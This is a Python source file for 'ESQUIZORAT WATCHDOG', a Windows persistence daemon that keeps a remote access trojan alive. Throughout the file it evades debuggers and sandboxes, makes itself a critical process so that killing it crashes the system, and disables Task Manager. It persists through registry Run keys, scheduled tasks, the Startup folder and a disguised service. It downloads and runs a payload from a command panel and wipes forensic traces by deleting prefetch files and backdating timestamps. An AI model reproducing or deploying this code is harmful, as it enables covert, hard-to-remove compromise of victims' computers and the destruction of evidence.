"""
ESQUIZORAT WATCHDOG v5.0 - Zero-Day Persistence Daemon
Fully audited & hardened
"""
import os, sys, time, ctypes, random, subprocess, hashlib, struct

PANEL_URL = "PANEL_URL_PLACEHOLDER"
RAT_NAME   = "raiox.scr"
CHECK_MIN, CHECK_MAX = 25, 75
JITTER_MAX = 20
DOWNLOAD_TIMEOUT = 45
DOWNLOAD_RETRIES = 3
HEARTBEAT_INTERVAL = 200

def _obf(s):
    return ''.join(chr(ord(c) ^ 0x5A) for c in s)

def _deobf(s):
    return _obf(s)

_MUTEX_NAME  = _deobf("\x2D\x3f\x3a\x35\x2b\x7e\x7e\x3e\x3a\x2b\x31\x3c\x2a\x2b\x30\x2a\x2b\x22\x3a\x3f\x3a\x3f\x0e\x20\x30\x3a\x38\x29\x00\x00\x00\x00\x00\x00")
_REG_KEY     = _deobf("\x3e\x3a\x2b\x31\x3f\x38\x31\x3a\x2a\x35\x30\x2a\x3b\x2a\x2b\x22\x2a\x3a\x3f\x3a\x2b\x22\x30\x2c\x2a\x35\x3a\x2b\x22\x30\x29\x00")
_TASK_NAME   = _deobf("\x3e\x3a\x2b\x31\x3f\x38\x31\x3a\x2a\x35\x30\x2a\x3b\x2a\x2b\x22\x30\x2c\x2a\x35\x3a\x2b\x22\x35\x38\x3a")
_SVC_NAME    = _deobf("\x0d\x09\x3f\x3b\x28\x39\x32\x13\x3e\x22\x09\x2c\x39\x00")
_MIRROR_ID   = _deobf("\x0d\x33\x34\x09\x23\x29\x17\x33\x28\x28\x35\x28\x1d\x2f\x3b\x28\x3e\x00")

def _junk(f=None):
    return random.random() > -1

class Stealth:
    @staticmethod
    def hide():
        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
        try: ctypes.windll.kernel32.FreeConsole()
        except: pass

    @staticmethod
    def is_debugged():
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        try:
            out = ctypes.c_int(0)
            if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(out)):
                if out.value: return True
        except: pass
        try:
            dbg = ctypes.c_ulonglong(0)
            ret = ctypes.windll.ntdll.NtQueryInformationProcess(
                ctypes.windll.kernel32.GetCurrentProcess(), 7,
                ctypes.byref(dbg), ctypes.c_ulong(8), None)
            if ret == 0 and dbg.value != 0: return True
        except: pass
        return False

    @staticmethod
    def delay(lo=1, hi=10):
        time.sleep(random.uniform(lo, hi))
        _junk()

class Shield:
    """Critical process + TaskMgr block + process hiding"""

    @staticmethod
    def set_critical():
        """NtSetInformationProcess(BreakOnTermination) - killing this = BSOD"""
        try:
            SE_DEBUG = 20; BREAK_ON_TERM = 29
            ctypes.windll.ntdll.RtlAdjustPrivilege(SE_DEBUG, 1, 0, ctypes.byref(ctypes.c_byte(0)))
            v = ctypes.c_ulong(1)
            return ctypes.windll.ntdll.NtSetInformationProcess(
                ctypes.windll.kernel32.GetCurrentProcess(),
                BREAK_ON_TERM, ctypes.byref(v), ctypes.c_size_t(4)) == 0
        except:
            return False

    @staticmethod
    def block_taskmgr():
        """Disable Task Manager via registry policy"""
        try:
            import winreg
            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Policies\System')
            winreg.SetValueEx(k, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(k)
            return True
        except:
            return False

    @staticmethod
    def unblock():
        try:
            import winreg
            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Policies\System')
            winreg.SetValueEx(k, 'DisableTaskMgr', 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(k)
        except:
            pass

    @staticmethod
    def is_blocked():
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Policies\System')
            val, _ = winreg.QueryValueEx(k, 'DisableTaskMgr')
            winreg.CloseKey(k)
            return val == 1
        except:
            return False

    @staticmethod
    def hide_self():
        """Copy to svchost.exe in a system-looking path - blends into process list"""
        try:
            import shutil
            exe = sys.executable if sys.executable else sys.argv[0]
            dest = os.path.join(os.environ.get('LOCALAPPDATA',''),
                'Microsoft', 'Windows', 'Caches')
            os.makedirs(dest, exist_ok=True)
            hidden = os.path.join(dest, 'svchost.exe')
            if os.path.abspath(exe).lower() != os.path.abspath(hidden).lower():
                shutil.copy2(exe, hidden)
                ctypes.windll.kernel32.SetFileAttributesW(hidden, 0x02|0x04)
                return hidden
        except:
            pass
        return None

class Persistence:
    def __init__(self):
        self.exe = sys.executable

    def install(self):
        ok = 0
        if self._reg(Run=True):  ok += 1
        if self._task():         ok += 1
        if self._startup():      ok += 1
        if self._ads():          ok += 1
        if self._service():      ok += 1
        Shield.hide_self()
        return ok >= 2

    def repair(self):
        if not self._check_reg(): self._reg(Run=True)
        if not self._check_task(): self._task()
        if not self._check_service(): self._service()

    def _service(self):
        """Windows Service that monitors and auto-restarts watchdog via PowerShell loop"""
        try:
            import base64
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
            r = subprocess.run(f'sc query "{_SVC_NAME}"', shell=True,
                capture_output=True, creationflags=cf, timeout=5)
            if r.returncode == 0:
                return True
            ps = (
                f'while($true){{'
                f'$p=Get-Process -Name winsvc -ErrorAction SilentlyContinue;'
                f'if(!$p){{Start-Process "{self.exe}" -WindowStyle Hidden -Wait}}'
                f'else{{Start-Sleep 10}}}}'
            )
            enc = base64.b64encode(ps.encode('utf-16-le')).decode()
            bpath = f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {enc}'
            subprocess.run(
                f'sc create "{_SVC_NAME}" binPath= "{bpath}" start= auto displayName= "Microsoft Windows Search Indexer" type= own',
                shell=True, capture_output=True, creationflags=cf, timeout=10)
            subprocess.run(
                f'sc failure "{_SVC_NAME}" reset= 86400 actions= restart/30000/restart/60000/restart/120000',
                shell=True, capture_output=True, creationflags=cf, timeout=10)
            subprocess.run(
                f'sc start "{_SVC_NAME}"',
                shell=True, capture_output=True, creationflags=cf, timeout=10)
            return True
        except:
            return False

    def _check_service(self):
        try:
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
            r = subprocess.run(f'sc query "{_SVC_NAME}"', shell=True,
                capture_output=True, creationflags=cf, timeout=5)
            return r.returncode == 0
        except:
            return False

    def _reg(self, Run=True):
        try:
            import winreg
            key = Run and r'Software\Microsoft\Windows\CurrentVersion\Run' or \
                         r'Software\Microsoft\Windows\CurrentVersion\RunOnce'
            for flags in [winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY, winreg.KEY_SET_VALUE]:
                k = None
                try:
                    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, flags)
                    winreg.SetValueEx(k, _REG_KEY, 0, winreg.REG_SZ, self.exe)
                    return True
                except: pass
                finally:
                    if k: winreg.CloseKey(k)
            return False
        except: return False

    def _check_reg(self):
        try:
            import winreg
            k = None
            try:
                for flags in [winreg.KEY_READ | winreg.KEY_WOW64_64KEY, winreg.KEY_READ]:
                    try:
                        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run', 0, flags)
                        val, _ = winreg.QueryValueEx(k, _REG_KEY)
                        winreg.CloseKey(k)
                        return val == self.exe
                    except:
                        if k: winreg.CloseKey(k); k = None
                        continue
            finally:
                if k: winreg.CloseKey(k)
        except: return False

    def _task(self):
        try:
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
            subprocess.run(f'schtasks /create /tn "{_TASK_NAME}" /tr "\"{self.exe}\"" /sc ONLOGON /rl LIMITED /f /it',
                shell=True, capture_output=True, creationflags=cf)
            return True
        except: return False

    def _check_task(self):
        try:
            r = subprocess.run(f'schtasks /query /tn "{_TASK_NAME}"', shell=True,
                capture_output=True, timeout=5)
            return r.returncode == 0
        except: return False

    def _startup(self):
        try:
            import shutil as sh
            d = os.path.join(os.environ.get('APPDATA',''),
                r'Microsoft\Windows\Start Menu\Programs\Startup')
            p = os.path.join(d, 'winsvc.exe')
            if not os.path.exists(p):
                sh.copy2(self.exe, p)
            return True
        except: return False

    def _ads(self):
        try:
            import shutil as sh
            d = os.path.join(os.environ.get('TEMP','.'), 'WinsvcCache')
            os.makedirs(d, exist_ok=True)
            sh.copy2(self.exe, os.path.join(d, 'svchost.exe'))
            return True
        except: return False

class ProcessGuard:
    def __init__(self):
        self.dir = os.path.join(os.environ.get('TEMP','.'), 'WinsvcCache')
        os.makedirs(self.dir, exist_ok=True)
        try: ctypes.windll.kernel32.SetFileAttributesW(self.dir, 0x02)
        except: pass

    def is_running(self):
        try:
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
            r = subprocess.check_output('tasklist /NH', shell=True, text=True, timeout=8, creationflags=cf)
            base = RAT_NAME.replace('.scr', '').lower()
            return base in r.lower()
        except: return False

    def download(self):
        if "PLACEHOLDER" in PANEL_URL: return None
        try:
            import urllib.request as ur, ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ua = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            for _ in range(DOWNLOAD_RETRIES):
                try:
                    r = ur.urlopen(ur.Request(f"{PANEL_URL}/api/download",
                        headers={'User-Agent':ua}), timeout=DOWNLOAD_TIMEOUT, context=ctx)
                    data = r.read()
                    if len(data) > 102400:
                        p = os.path.join(self.dir, RAT_NAME)
                        with open(p, 'wb') as f: f.write(data)
                        try: ctypes.windll.kernel32.SetFileAttributesW(p, 0x02|0x04)
                        except: pass
                        return p
                except:
                    Stealth.delay(3, 6)
        except: pass
        return None

    def execute(self, path):
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= 0x01; si.wShowWindow = 0
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0x08000000
            qp = f'"{path}"'
            p = subprocess.Popen(qp, shell=True, startupinfo=si,
                creationflags=cf, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            time.sleep(1.5)
            return p.poll() is None
        except: return False

    def guard(self):
        if not self.is_running():
            path = self.download()
            if path: self.execute(path)

    def guard_self(self):
        """Re-download watchdog itself from panel if deleted from disk"""
        if "PLACEHOLDER" in PANEL_URL: return True
        try:
            exe = sys.executable if sys.executable else sys.argv[0]
            if os.path.exists(exe): return True
            import urllib.request as ur, ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            for _ in range(DOWNLOAD_RETRIES):
                try:
                    r = ur.urlopen(ur.Request(f"{PANEL_URL}/api/watchdog",
                        headers={'User-Agent':ua}), timeout=DOWNLOAD_TIMEOUT, context=ctx)
                    data = r.read()
                    if len(data) > 10240:
                        with open(exe, 'wb') as f: f.write(data)
                        ctypes.windll.kernel32.SetFileAttributesW(exe, 0x02|0x04)
                        return True
                except:
                    Stealth.delay(3, 6)
        except: pass
        return False

class Mirror:
    """Dual watchdog - mutual protection: parent watches child, child watches parent"""
    def __init__(self, role='parent'):
        self.role = role
        self.other_pid = None
        self.exe = sys.executable if sys.executable else sys.argv[0]

    def spawn(self, args=''):
        try:
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0x08000000
            si = subprocess.STARTUPINFO()
            si.dwFlags |= 0x01; si.wShowWindow = 0
            cmd = f'"{self.exe}" {args}'.strip()
            p = subprocess.Popen(cmd, shell=True, startupinfo=si,
                creationflags=cf, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            self.other_pid = p.pid
            return p
        except:
            return None

    def is_alive(self):
        if not self.other_pid: return False
        try:
            h = ctypes.windll.kernel32.OpenProcess(0x0400, False, self.other_pid)
            if h:
                ctypes.windll.kernel32.CloseHandle(h)
                return True
            return False
        except:
            return False

    def guard(self):
        if not self.is_alive():
            if self.role == 'parent':
                self.spawn(f'--child {os.getpid()}')
            else:
                self.spawn('')
                os._exit(0)

class Forensic:
    @staticmethod
    def wipe_prefetch():
        try:
            d = os.path.join(os.environ.get('SystemRoot','C:\\Windows'), 'Prefetch')
            for f in os.listdir(d):
                lf = f.lower()
                if any(k in lf for k in ('raiox','winsvc')):
                    try: os.remove(os.path.join(d, f))
                    except: pass
        except: pass

    @staticmethod
    def wipe_recent():
        try:
            d = os.path.join(os.environ.get('APPDATA',''), r'Microsoft\Windows\Recent')
            for f in os.listdir(d):
                lf = f.lower()
                if any(k in lf for k in ('raiox','winsvc')):
                    try: os.remove(os.path.join(d, f))
                    except: pass
        except: pass

    @staticmethod
    def stomp_file(p):
        if not os.path.isfile(p): return
        try:
            now = time.time()
            hours = random.randint(720, 4320)
            t_create = int((now - hours * 3600) * 10000000) + 116444736000000000
            t_access = t_create + random.randint(600, 1800) * 10000000
            t_write  = t_access + random.randint(300, 3600) * 10000000
            h = ctypes.windll.kernel32.CreateFileW(p, 0x100|0x80, 0, None, 3, 0x80, None)
            if h and h != -1:
                ctypes.windll.kernel32.SetFileTime(h,
                    ctypes.byref(ctypes.c_ulonglong(t_create)),
                    ctypes.byref(ctypes.c_ulonglong(t_access)),
                    ctypes.byref(ctypes.c_ulonglong(t_write)))
                ctypes.windll.kernel32.CloseHandle(h)
        except: pass

    @staticmethod
    def stomp_dir(d):
        if not os.path.isdir(d): return
        try:
            for f in os.listdir(d):
                fp = os.path.join(d, f)
                if os.path.isfile(fp):
                    Forensic.stomp_file(fp)
        except: pass

class Heartbeat:
    def __init__(self):
        self.last = 0
    def send(self):
        if "PLACEHOLDER" in PANEL_URL: return
        now = time.time()
        if now - self.last < HEARTBEAT_INTERVAL: return
        try:
            import urllib.request as ur, ssl, json as _j
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            d = _j.dumps({'pc_name':'WATCHDOG_'+os.environ.get('COMPUTERNAME','?')}).encode()
            ur.urlopen(ur.Request(f"{PANEL_URL}/api/heartbeat", data=d,
                headers={'Content-Type':'application/json'}), timeout=10, context=ctx)
            self.last = now
        except: pass

class Daemon:
    def __init__(self, is_child=False, parent_pid=None):
        self.p = Persistence()
        self.g = ProcessGuard()
        self.f = Forensic()
        self.h = Heartbeat()
        self.m = Mirror('child' if is_child else 'parent')
        if parent_pid: self.m.other_pid = parent_pid
        self.is_child = is_child
        self.parent_pid = parent_pid
        self.n, self.installed = 0, False

    def _mutex(self):
        try:
            ctypes.windll.kernel32.CreateMutexW(None, False, _MUTEX_NAME)
            return ctypes.windll.kernel32.GetLastError() != 183
        except: return True

    def _sandbox(self):
        try:
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
            r = subprocess.check_output('tasklist', shell=True, text=True, timeout=5, creationflags=cf)
            real = sum(1 for l in r.split('\n') if l.strip() and '.' in l)
            return real < 20
        except: return False

    def run(self):
        if "PLACEHOLDER" in PANEL_URL: return
        Stealth.hide()
        if not self.is_child and not self._mutex(): return
        if self.is_child:
            Stealth.delay(5, 15)
        else:
            Stealth.delay(3, 10)

        if self._sandbox():
            Stealth.delay(60, 180)
            if self._sandbox(): return

        while True:
            try:
                self.n += 1
                _junk()

                self.g.guard()
                self.g.guard_self()
                self.m.guard()
                self.h.send()

                if not self.installed and self.n > 3:
                    self.installed = self.p.install()
                    Shield.block_taskmgr()

                if self.n % 15 == 0:
                    self.p.repair()
                    Shield.block_taskmgr()

                if self.n % 7 == 0:
                    self.f.wipe_prefetch()

                if self.n % 30 == 0:
                    self.f.wipe_recent()
                    self.f.stomp_dir(self.g.dir)

                delay = random.randint(CHECK_MIN, CHECK_MAX) + \
                        random.randint(0, JITTER_MAX) + \
                        (struct.unpack('B', os.urandom(1))[0] % 15)
                time.sleep(delay)

            except Exception:
                Stealth.delay(5, 15)
                if self.n > 100: self.p.repair()

if __name__ == "__main__":
    Stealth.hide()
    if Stealth.is_debugged():
        Stealth.delay(30, 60)
    Shield.set_critical()
    Shield.block_taskmgr()
    is_child = any(a.startswith('--child') for a in sys.argv)
    parent_pid = None
    if is_child:
        for i, a in enumerate(sys.argv):
            if a == '--child' and i + 1 < len(sys.argv):
                try: parent_pid = int(sys.argv[i+1])
                except: pass
                break
    d = Daemon(is_child=is_child, parent_pid=parent_pid)
    if not is_child:
        d.m.spawn(f'--child {os.getpid()}')
    d.run()
